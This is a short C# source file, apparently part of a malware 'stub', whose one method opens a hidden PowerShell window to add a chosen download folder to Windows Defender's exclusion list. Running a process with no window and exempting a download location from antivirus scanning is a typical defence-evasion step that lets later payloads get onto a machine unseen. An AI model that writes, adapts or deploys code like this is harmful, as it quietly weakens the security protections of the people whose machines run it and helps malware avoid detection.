using System.Collections.Generic;
using System;
using System.Diagnostics;
using System.Linq;
using System.Management;

namespace Stub.Help
{
    class Protections
    {
        public static void AddFolderToDefenderExclusions(string downloadFolderPath)
        {
            string args = $"Add-MpPreference -ExclusionPath '{downloadFolderPath}' ";
            Process.Start(new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = args
            });
        }



    }

}
